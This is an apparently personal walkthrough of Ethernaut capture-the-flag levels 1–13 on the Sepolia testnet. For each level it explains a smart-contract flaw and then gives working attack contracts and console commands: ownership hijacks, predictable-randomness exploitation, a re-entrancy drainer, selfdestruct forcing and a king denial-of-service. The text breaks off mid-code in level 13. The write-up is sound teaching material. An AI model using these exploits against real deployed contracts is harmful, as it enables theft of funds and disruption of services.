# Ethernaut
The Ethernaut is a Web3/Solidity based wargame inspired by [overthewire.org](https://overthewire.org), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.
# Setup

Welp. I used [google](https://cloud.google.com/application/web3/faucet/ethereum/sepolia) Sepolia Faucet to get some ETH.
# 1 - Fallback

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

This contract tracks ETH contributions and assigns ownership. When deployed, the deployer becomes the owner and is given a massive contribution balance:

```c
constructor() {  
    owner = msg.sender;  
    contributions[msg.sender] = 1000 * (1 ether);  
}
```

Other users can contribute small amounts of ETH (less than 0.001 ether):

```c
function contribute() public payable {  
    require(msg.value < 0.001 ether);  
    contributions[msg.sender] += msg.value;  
  
    if (contributions[msg.sender] > contributions[owner]) {  
        owner = msg.sender;  
    }  
}
```

Because the original owner has 1000 ether recorded, it’s practically impossible to surpass them through `contribute()`.

The vulnerability is in the `receive()` function:

```c
receive() external payable {  
    require(msg.value > 0 && contributions[msg.sender] > 0);  
    owner = msg.sender;  
}
```

If a user has contributed **any non-zero amount**, they can send ETH directly to the contract address. This triggers `receive()` and immediately sets them as the new owner.

Once ownership is gained, the attacker can drain the contract:

```c
function withdraw() public onlyOwner {  
    payable(owner).transfer(address(this).balance);  
}
```

So the flaw is that ownership can be hijacked via the `receive()` function after making a tiny contribution.

The challenge is called “Fallback” because the vulnerability is hidden inside Solidity’s special ETH-handling function (`receive()`), allowing ownership takeover through a fallback-style call (meaning a direct ETH transfer to the contract address that triggers the special `receive()`/`fallback()` function automatically, instead of explicitly calling a named function like `contribute()`) instead of a normal function call. 

**Step 1: Make a small contribution** (to satisfy the `contributions[msg.sender] > 0` requirement)

```js
await contract.contribute({value: toWei("0.0001")})
```

**Step 2: Send ETH directly to the contract** to trigger the `receive()` fallback and become owner

```js
await sendTransaction({from: player, to: contract.address, value: toWei("0.0001")})
```

**Step 3: Verify you're the owner**

```js
await contract.owner()
// Should return your player address
```

**Step 4: Drain the contract balance**

```js
await contract.withdraw()
```

```js
await getBalance(contract.address) // should return "0"
```

![1](Images/1.png)

# 2 - Fallout

Claim ownership of the contract below to complete this level.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

This is a classic **constructor name mismatch bug** from Solidity <0.8.

In older Solidity (pre-0.5), constructors were defined by naming a function **the same as the contract**. The contract is named `Fallout` but the "constructor" is named `Fal1out` (with a **1** instead of **l**).

```c
contract Fallout {        // contract name
    function Fal1out()    // typo! this is NOT a constructor
```

This means `Fal1out()` is just a **regular public function** that anyone can call to become owner.

```js
await contract.Fal1out()
```

That's it. Verify:

```js
await contract.owner() // should be your player address
```

![2](Images/2.png)

# 3 - Coin Flip

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

The contract tries to simulate randomness using `blockhash(block.number - 1)`, but **blockchain data is fully public and deterministic**. Anyone can read the same block hash and compute the "random" result **before** submitting their guess.

How the Contract Thinks It's Random

```c
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

This number is exactly **2²⁵⁵**  half of the maximum uint256 value (2²⁵⁶). This is intentional it's used to split the block hash into two buckets (0 or 1), like a coin.

```c
function flip(bool _guess) public returns (bool) {
    // Step 1: grab last block's hash as a "random" number
    uint256 blockValue = uint256(blockhash(block.number - 1));

    // Step 2: prevent calling twice in same block
    if (lastHash == blockValue) {
        revert();
    }
    lastHash = blockValue;

    // Step 3: divide by FACTOR → result is either 0 or 1
    // if blockHash >= 2^255 → coinFlip = 1 (true)
    // if blockHash <  2^255 → coinFlip = 0 (false)
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    // Step 4: compare with your guess
    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0; // resets on wrong guess!
        return false;
    }
}
```

**`blockhash(block.number - 1)` is public data**. Anyone can read it. So we can run the exact same math and always know the answer before guessing.

When attacker contract calls the victim in the **same transaction**:
- Both contracts are executing in the **same block**
- So `block.number` and `blockhash(block.number - 1)` are **identical** in both
- We compute the answer → pass it → victim sees the same answer.

```
Block #1000
├── Your attack() runs
│   ├── reads blockhash(999)  → computes side = true
│   └── calls victim.flip(true)
│       └── victim reads blockhash(999) → side = true 
```

The contract has this guard:

```c
if (lastHash == blockValue) { revert(); }
```

We can only call `flip()` **once per block**. So we need to call it 10 times across 10 different blocks we need an **attacker contract** to do the math on-chain atomically.

Deploy This on Remix:

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface = a "contact card" for the victim contract
// We only need to declare the function we want to call
// Solidity uses this to know how to encode the call correctly
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {

    // Same FACTOR as victim (2^255 = half of max uint256)
    // Used to split blockhash into 0 or 1 (fake coin flip)
    // Must be identical to victim or prediction will be wrong
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Stores a reference to the victim contract
    // Type is ICoinFlip so we can call .flip() on it
    ICoinFlip target;

    // Runs once at deploy time
    // _target = the address of the CoinFlip level contract
    constructor(address _target) {
        // Cast the raw address into an ICoinFlip contract reference
        // Now we can call target.flip() like a normal function
        target = ICoinFlip(_target);
    }

    // Call this once per block, 10 times total
    // Each call = one guaranteed correct guess sent to victim
    function attack() public {

        // Get the previous block's hash as a uint256
        // block.number    = current block (e.g. 1000)
        // block.number-1  = previous block (e.g. 999)
        // blockhash(999)  = 32 byte hash of block 999
        // uint256(...)    = cast to number so we can do math
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Integer division by 2^255
        // if blockValue >= 2^255 → result = 1
        // if blockValue <  2^255 → result = 0
        // This is the exact same math the victim runs
        uint256 coinFlip = blockValue / FACTOR;

        // Convert 0/1 to false/true
        // ternary: condition ? value_if_true : value_if_false
        bool side = coinFlip == 1 ? true : false;

        // Call victim with our pre-computed correct answer
        // KEY INSIGHT: this runs in the SAME block as our prediction
        // so block.number and blockhash are identical in both contracts
        // victim computes same side → sees our guess matches → consecutiveWins++
        target.flip(side);
    }
}
```

In the Ethernaut browser console:

```js
contract.address
// copy this address, you'll need it soon
```

1. Go to **[remix.ethereum.org](https://remix.ethereum.org)**
2. In the file explorer, click **"New File"** → name it `CoinFlipAttack.sol`
3. Paste the full contract code
4. Click the **Solidity compiler tab** (left sidebar, looks like `<S>`)
5. Set compiler version to **0.8.0** or higher
6. Click **"Compile CoinFlipAttack.sol"**
7. Open MetaMask → make sure you're on **Sepolia testnet**
8. In Remix, click the **Deploy tab** (left sidebar, looks like Ethereum logo)
9. Under **Environment**, select **"Injected Provider - MetaMask"**
10. MetaMask will pop up asking to connect → approve it
11. You should see your wallet address appear in Remix
12. Under **Contract**, make sure `CoinFlipAttack` is selected
13. Expand the `_target` field next to Deploy button
14. Paste your level's contract address from Step 1
15. Click **"Deploy"**
16. MetaMask pops up → confirm the transaction
17. Wait for it to confirm on Sepolia

In Remix's **Deployed Contracts** section at the bottom left:

1. Expand your deployed `CoinFlipAttack`
2. You'll see the `attack` button
3. Click `attack` → confirm in MetaMask → wait for tx to confirm (~12 sec)
4. Repeat **10 times**, waiting for each tx to confirm before the next

![3](Images/3.png)

More easy way than manually doing this is to copy the deployed contract address from Remix.

```js
// attacker contract address from Remix
const attackerAddress = "0x91f9e9614bC885F79B19f38B4151Abbc1f8D2699";

// minimal ABI - only need attack function
const abi = [{"inputs":[],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"}];

// use web3 which is already injected by Ethernaut
const attacker = new web3.eth.Contract(abi, attackerAddress);

// get your player address
const accounts = await web3.eth.getAccounts();
const from = accounts[0];

async function runAttack() {
    for (let i = 1; i <= 10; i++) {
        console.log("Attack " + i + "/10...");

        // send attack and wait for confirmation
        await attacker.methods.attack().send({ from: from });

        // check streak
        const wins = (await contract.consecutiveWins()).toString();
        console.log("Streak: " + wins + "/10");

        // wait 13 seconds for next block
        if (i < 10) {
            console.log("Waiting for next block...");
            await new Promise(r => setTimeout(r, 13000));
        }
    }
    console.log("Done! Submit the instance.");
}

runAttack();
```

Now Metamask will pop up automatically and confirm it 10 times in row.

```js
// To check streak
(await contract.consecutiveWins()).toString()
```

![4](Images/4.png)

Now Submit the level.
# 4 - Telephone

Claim ownership of the contract below to complete this level.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

It's a simple ownership contract. It has one job: let someone take ownership via `changeOwner()`. But it tries to guard that with a condition:

```
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

Ironically, this condition **only allows the change** when the caller seems "indirect" which is backwards from what a secure contract would want.

**`tx.origin`** The original human wallet that kicked off the entire transaction chain. Always an EOA (Externally Owned Account — a real wallet, never a contract). 

**`msg.sender`** The immediate caller of the current function. Could be a wallet *or* a contract.

**The difference** ``` You (wallet) → Contract A → Contract B

Inside Contract B:

- `tx.origin` = **You** (the wallet, start of the chain)
- `msg.sender` = **Contract A** (whoever called B directly)

When you call a contract directly with no middleman, both are just you — so they're equal.

**Why `tx.origin` is dangerous for auth** ?

It can be spoofed indirectly. If you trick a user into calling your malicious contract, `tx.origin` is still their wallet — meaning you can impersonate their authority downstream without them realizing it.

Deploy this contract in Remix:

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    
    function attack(address _target) public {
        // _target = the Telephone level contract address
        // we use low-level .call() to avoid needing an interface
        // this sidesteps the "abstract contract" compiler error
        (bool success,) = _target.call(
            // encode the function signature + argument
            // msg.sender here = this contract (TelephoneAttack)
            // but when Telephone checks tx.origin, it sees YOUR wallet
            // so tx.origin != msg.sender → condition passes → owner changes
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );

        // if the call failed for any reason, revert everything
        require(success);
    }
}
```

Copy deployed contract address.

Now in the Ethernaut browser console. Get your level contract address:

```js
contract.address
```

**Call attack with that address**

Go back to Remix → Deployed Contracts → expand `TelephoneAttack` → paste the address into the `attack` field → click **attack** → confirm in MetaMask

```c
await contract.owner()
// should return your wallet address
```

![5](Images/5.png)

![6](Images/6.png)

# 5 - Token

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

A basic token system. You start with 20 tokens. It tracks balances in a mapping and lets you transfer tokens to others. That's it.

In Solidity 0.6, `uint256` is an **unsigned integer** — it can never be negative. It ranges from `0` to `2²⁵⁶-1`.

So what happens when you go below zero?

```c
0 - 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

It **wraps around** to the maximum possible uint256 value. This is called an underflow.

```c
require(balances[msg.sender] - _value >= 0);
```

This looks like it's checking you have enough balance. But `uint256` can **never** be negative — so this condition is **always true**, no matter what.

Even if you have 20 tokens and try to transfer 21:

```
 20 - 21 = underflows → huge number → still >= 0 
```

```js
// transfer 21 tokens to any address or level addr (more than your balance of 20)
// this triggers the underflow on your own balance
await contract.transfer("0x478f3476358Eb166Cb7adE4666d04fbdDB56C407", 21)

// verify your new balance (should be a massive number)
(await contract.balanceOf(player)).toString()
```

The fix would have been to write it as:

```c
require(balances[msg.sender] >= _value);
```

than:

```c
require(balances[msg.sender] - _value >= 0);
```

This checks if you actually have enough **before** subtracting — no underflow possible. This is how Solidity 0.8+ handles it automatically under the hood.
# 6 - Delegation

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

There are **two contracts**:

- **Delegate** — has an `owner` variable and a `pwn()` function that sets owner to caller
- **Delegation** — also has an `owner` variable, holds a reference to Delegate, and has a fallback that forwards any unknown calls to Delegate via `delegatecall`

In solidity:

**`delegatecall`**

A low level call like `.call()` but with one critical difference:

```
Normal call:
You → Contract B → B's code runs in B's storage

Delegatecall:
You → Contract A → B's code runs in A's storage
```

The **code** comes from Delegate, but the **context** (storage, `msg.sender`, `owner`) is Delegation's. So when `pwn()` runs via delegatecall and does `owner = msg.sender`, it's writing to **Delegation's** owner slot, not Delegate's.

**Method ID / `msg.data`**

When you call a function, Solidity encodes it as the first 4 bytes of the keccak256 hash of the function signature:

```c
keccak256("pwn()") → first 4 bytes = the method ID
```

When Delegation's fallback fires, it passes `msg.data` straight to delegatecall — which Delegate reads as "call pwn()".

Solve from console:

```js
// encode the pwn() function signature as msg.data
// this is what gets passed to the fallback → delegatecall → pwn()
await sendTransaction({
    from: player,
    to: contract.address,
    data: web3.utils.keccak256("pwn()").slice(0, 10)
})

// verify
await contract.owner() // should be your address
```
# 7 - Force

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

It's a completely empty contract. No `receive()`, no `fallback()`, no payable functions — nothing. Normally if you try to send ETH to it, it would just revert. There's no way to accept ETH... or is there?

**`selfdestruct`**

There's one way to force ETH into any contract regardless of its code — `selfdestruct`.

When a contract self destructs:

1. It **destroys itself** (removes its code from the blockchain)
2. It **forcefully sends** all its ETH to a target address

The target contract has **zero say** in this. No fallback is called, no receive is triggered. The ETH just arrives. This works even on empty contracts like Force.

Deploy this on Remix, fund it, then destroy it:

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {

    constructor() payable {}

    function attack(address payable _target) public {
        // selfdestruct is deprecated but still works for this
        selfdestruct(_target);
    }

    // just in case, also allow direct ETH receive
    receive() external payable {}
}
```

![7](Images/7.png)

Verify in console:

```js
await getBalance(contract.address) // should be > 0
```
# 8 - Vault

Unlock the vault to pass the level!

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

A vault that stores a password and a locked state. You call `unlock()` with the correct password and it unlocks. 

**`private` doesn't mean secret on blockchain**

The `password` variable is marked `private` — but that only means **other contracts** can't read it directly. It does **not** hide it from anyone reading the blockchain.

Everything stored on-chain is **publicly readable**. `private` just prevents Solidity-level access, not blockchain-level access.

**Storage slots**

Every contract has storage laid out in sequential slots starting at 0:

```c
slot 0 → locked (bool)
slot 1 → password (bytes32)
```

We can read any slot directly using `web3.eth.getStorageAt`.

```js
// read slot 1 where password is stored
const password = await web3.eth.getStorageAt(contract.address, 1)
console.log(password)

// unlock with the retrieved password
await contract.unlock(password)

// verify
await contract.locked() // should return false
```
# 9 - King

A ponzi king-of-the-hill game. Whoever sends more ETH than the current prize becomes the new king. When dethroned, the old king gets paid. The owner can always reclaim kingship for free.

When you submit the level, Ethernaut tries to reclaim kingship — you need to **prevent that from ever succeeding**.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

Look at the receive function:

```c
payable(king).transfer(msg.value);
king = msg.sender;
```

Before crowning a new king, it **pays the old king first**. If that payment **fails**, the whole transaction reverts — meaning no new king can ever be set.

So if we make a contract the king, and that contract has no `receive()` or `fallback()` — or one that **always reverts** — then nobody can ever pay it, nobody can ever become the new king, game is permanently broken.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {

    // deploy with enough ETH to become king
    constructor() payable {}

    function attack(address payable _target) public {
        // send ETH to King contract to claim kingship
        // once this contract is king, nobody can dethrone it
        (bool success,) = _target.call{value: address(this).balance}("");
        require(success);
    }

    // no receive() or fallback()
    // any attempt to pay us reverts
    // so transfer() in King's receive() will always fail
    // meaning no new king can ever be set
}
```

Check current prize:

```js
(await contract.prize()).toString()
// "1000000000000000"
```

Deploy `KingAttack` on Remix with slightly more ETH than the prize `1000000000000001` Wei.

![8](Images/8.png)

Call `attack` with `contract.address`.

Verify:

```js
await contract._king() // should be your KingAttack contract address
```
# 10 - Re-entrancy

The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

A simple donation and withdrawal system. You can donate ETH to any address, check balances, and withdraw your own balance. 

Look at the withdraw function order of operations:

```c
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}(""); // 1. sends ETH first
        balances[msg.sender] -= _amount;                       // 2. updates balance AFTER
    }
}
```

It sends ETH **before** updating the balance. This is the classic mistake.

When the contract sends ETH to us via `.call()`, if we're a contract, our `receive()` function fires **automatically**. And inside that `receive()`, we can call `withdraw()` **again** before the balance ever gets updated.

```c
Attack calls withdraw()
→ contract sends ETH
→ our receive() fires
  → attack calls withdraw() again  ← balance still not updated!
  → contract sends ETH again
  → our receive() fires again
    → repeat until contract is drained
→ balance finally updated (too late)
```

This is called **re-entrancy** — we re-enter the withdraw function recursively before it finishes.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceAttack {

    address payable target;
    uint256 amount;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() public payable {
        amount = msg.value;

        // donate using raw call
        (bool success,) = target.call{value: amount}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success);

        // trigger first withdrawal
        (bool success2,) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success2);
    }

    // re-enters withdraw before balance updates
    receive() external payable {
        if (target.balance >= amount) {
            target.call(
                abi.encodeWithSignature("withdraw(uint256)", amount)
            );
        }
    }

    // send drained ETH back to your wallet
    function collect() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

First check contract balance:

```js
await getBalance(contract.address) // note this amount
```

The contract has `0.001 ETH`. So deploy `ReentranceAttack` with the target address, then:

1. In Remix, call `attack` with value set to `1000000000000000` Wei (= 0.001 ETH)
2. After tx confirms, verify in console:

```js
await getBalance(contract.address) // should be "0"
```

3. Call `collect` in Remix to get the ETH back to your wallet
4. Submit
# 11 - Elevator

This elevator won't let you reach the top of your building. Right?
##### Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

We need to reach to top. An elevator that tries to reach the top floor. It asks the calling `Building` contract "is this the last floor?" twice. If the first check says **no**, it sets the floor and asks again — setting `top` to whatever the second answer is.

The Elevator blindly trusts whatever `isLastFloor()` returns. It calls it **twice** expecting consistent answers — but it has no way to enforce that.

```c
if (!building.isLastFloor(_floor)) {  // expects false → enter the if
    floor = _floor;
    top = building.isLastFloor(floor); // expects false again → but we return true!
}
```

We just need a contract that returns **different values** on each call:

- 1st call → return `false` (to pass the if check)
- 2nd call → return `true` (to set `top = true`)

A simple counter toggle does the trick.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract BuildingAttack {

    // tracks how many times isLastFloor has been called
    uint256 callCount = 0;

    function isLastFloor(uint256) external returns (bool) {
        callCount++;
        // 1st call → false (passes the if check)
        // 2nd call → true (sets top = true)
        return callCount > 1;
    }

    function attack(address _target) public {
        IElevator(_target).goTo(1);
    }
}
```

- Deploy `BuildingAttack` on Remix
- Call `attack` with `contract.address`
- Verify in console:

```js
await contract.top() // should return true
```
# 12 - Privacy

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works

Tips:

- Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```

We need to call `unlock(bytes16 _key)` with the correct key derived from `data[2]` stored in private storage.

Solidity packs variables into 32-byte slots sequentially:

```c
Slot 0 → locked (bool, 1 byte)
Slot 1 → ID (uint256, 32 bytes — fills entire slot)
Slot 2 → flattening (uint8) + denomination (uint8) + awkwardness (uint16) → packed into one slot
Slot 3 → data[0] (bytes32)
Slot 4 → data[1] (bytes32)
Slot 5 → data[2] (bytes32)  ← this is what we need
```

`data[2]` sits at **storage slot 5**.

`private` only blocks **other Solidity contracts** from reading the variable. It does **not** hide data from anyone reading raw blockchain storage. Every slot is publicly readable.

The `unlock` function needs:

```c
require(_key == bytes16(data[2]));
```

`bytes16(data[2])` takes the **first 16 bytes** of the 32-byte value (Solidity truncates from the right when casting `bytes32 → bytes16`).

Step 1: Read Slot 5

```js
// Read storage slot 5 where data[2] lives
const data2 = await web3.eth.getStorageAt(contract.address, 5)
console.log(data2)
// e.g. "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
```

Step 2: Truncate to bytes16 (first 16 bytes = first 32 hex chars after 0x)

```js
// bytes32 → bytes16 means taking the FIRST 16 bytes
// In hex: "0x" + first 32 characters of the 64-char hex string
const key = data2.slice(0, 34) // "0x" + 32 hex chars = first 16 bytes
console.log(key)
```

Step 3: Unlock

```js
await contract.unlock(key)
```

Step 4: Verify

```js
await contract.locked() // should return false
```
# 13 - Gatekeeper One

Make it past the gatekeeper and register as an entrant to pass this level.
##### Things that might help:

- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the special function `gasleft()`, in Solidity's documentation (see [Units and Global Variables](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [External Function Calls](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
### Gate 1 — `msg.sender != tx.origin`

We've seen this before (Telephone level). Just use an intermediary contract. When your wallet calls the attack contract, which calls `enter()`:

- `tx.origin` = your wallet
- `msg.sender` = attack contract

They differ → gate passes.
### Gate 2 — `gasleft() % 8191 == 0`

At the **exact moment** this modifier runs, the remaining gas must be a perfect multiple of 8191.

You can't predict gas consumption exactly — EVM opcodes vary. So you **brute-force** it: try every possible gas offset from `8191 * someMultiplier` to `8191 * someMultiplier + 8191` until one works.
### Gate 3 

Three conditions on `bytes8 _gateKey`, when viewed as a `uint64`:

```c
Let k = uint64(_gateKey)

Condition 1: uint32(k) == uint16(k)
Condition 2: uint32(k) != k  (full 64 bits)
Condition 3: uint32(k) == uint16(uint160(tx.origin))
```

Working it out byte by byte (64-bit = 8 bytes):

```c
k = [B7][B6][B5][B4] [B3][B2][B1][B0]
         ↑uint32↑      ↑uint16↑
```

**Condition 3** tells us what `uint16(k)` must equal — the last 2 bytes of your wallet address.

**Condition 1** says `uint32(k) == uint16(k)` — meaning the upper 2 bytes of the lower 4 bytes must be `0x0000`.

So bytes 4–5 must be `0x0000`.

**Condition 2** says `uint32(k) != uint64(k)` — meaning the upper 4 bytes can't all be zero. We can just keep your wallet's upper bytes there.

Formula:

```c
key = (your_address as bytes8) & 0xFFFFFFFF0000FFFF
```

This zeros out bytes 4–5, satisfies conditions 1 & 3, and keeps the upper bytes non-zero for condition 2.

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {

    function attack(address _target) public {
        // Construct key from tx.origin (your wallet address)
        // bytes8(uint64(uint160(tx.origin))) → take lower 8 bytes of address
        // mask 0xFFFFFFFF0000FFFF:
        //   - keeps upper 4 bytes (satisfies gate 3 part 2: uint64 != uint32)
        //   - zeros bytes 4-5    (satisfies gate 3 part 1: uint32 == uint16)
